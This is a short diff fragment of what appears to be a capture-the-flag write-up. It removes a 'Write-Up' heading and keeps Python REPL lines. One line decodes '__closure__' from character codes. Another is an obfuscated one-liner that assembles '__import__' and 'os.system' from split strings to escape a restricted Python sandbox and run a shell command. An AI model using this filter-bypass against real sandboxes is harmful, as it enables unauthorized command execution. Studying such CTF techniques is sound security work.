@@ -48,8 +48,6 @@ But portal is very picky to choose friends.
 >>> "".join([chr(x) for x in [95,95,99,108,111,115,117,114,101,95,95]])
 '__closure__'
 
-## Write-Up
-
 ```python
 >>> [b:=getattr(print,"_"*2+"sel"+"f"+"_"*2),i:=getattr(b,"_"*2+"imp"+"ort"+"_"*2),o:=i("o"+"s"),s:=getattr(o,"sy"+"stem"),s("ls -a")]
 .
